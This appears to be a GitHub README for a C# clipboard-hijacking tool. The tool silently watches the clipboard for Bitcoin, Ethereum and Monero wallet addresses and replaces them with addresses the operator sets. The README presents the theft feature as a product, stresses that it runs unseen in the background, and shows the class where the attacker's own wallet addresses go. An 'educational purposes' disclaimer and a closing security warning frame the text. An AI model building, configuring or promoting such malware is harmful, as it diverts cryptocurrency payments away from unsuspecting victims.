
# Crypto Address Clipper (C#)

## Overview

**Crypto Address Clipper** is a C# tool that monitors your system's clipboard for cryptocurrency wallet addresses (BTC, ETH, or XMR) and automatically replaces them with a predefined address. This project demonstrates the use of clipboard monitoring and regular expressions (regex) to detect specific cryptocurrency address patterns.

⚠️ **Disclaimer:** This project is for educational purposes only. Do not use it for illegal or unethical activities.

---

## Features

- Monitors clipboard for cryptocurrency wallet addresses using **regular expressions (regex)**:
  - **Bitcoin (BTC)**
  - **Ethereum (ETH)**
  - **Monero (XMR)**
- Replaces detected addresses with predefined addresses specific to BTC, ETH, or XMR 🔄.
- Lightweight and runs silently in the background 🛠️.
- Customizable regex patterns and replacement addresses for each cryptocurrency ⚙.

---

## How It Works

1. The application runs in the background, listening for clipboard changes.
2. It uses **regular expressions** to detect clipboard content matching BTC, ETH, or XMR wallet addresses.
3. Upon detecting a match, it replaces the address with a predefined wallet address of the same type (BTC, ETH, or XMR).
4. The replacement happens automatically, ensuring any pasted address points to the predefined address.

---

## Usage

1. Configure the replacement addresses in the code:
   ```csharp
        private class YourAddresses
        {
            public static string YourBtcAddressHere = "PutYourBtcAddressHere";
            public static string YourXmrAddressHere = "PutYourXmrAddressHere";
            public static string YourEthAddressHere = "PutYourEthAddressHere";

        }
   ```
   And you are good to go!

---

## Features

- **Regular Expressions (Regex):** Used to identify BTC, ETH, and XMR addresses efficiently 🔍.
- **Customizable:** Easily modify the regex patterns to support other cryptocurrencies 🛠️.
- **Operates Silently:** Runs in the background without interrupting the user experience 🖥️.
- **Address Replacement:** Automatically replaces clipboard addresses with custom, predefined addresses 🔄.

---

## Customization

You can customize the following:

- **Cryptocurrency Regex Patterns:** Add or modify patterns to detect additional wallet address formats.
- **Predefined Replacement Addresses:** Change the default addresses for each cryptocurrency directly in the code.

---


---
## Preview

![crypto address stealer](https://github.com/user-attachments/assets/02b1e00f-92a1-4476-811b-d70c827abea8)

---


## Security Considerations

This tool demonstrates the risks of clipboard hijacking in cryptocurrency transactions. It should only be used for educational purposes in controlled environments. Clipboard hijacking is a real threat, and users should always double-check wallet addresses before making transactions.

---

**Stay vigilant and always double-check wallet addresses before making any cryptocurrency transactions!**

---
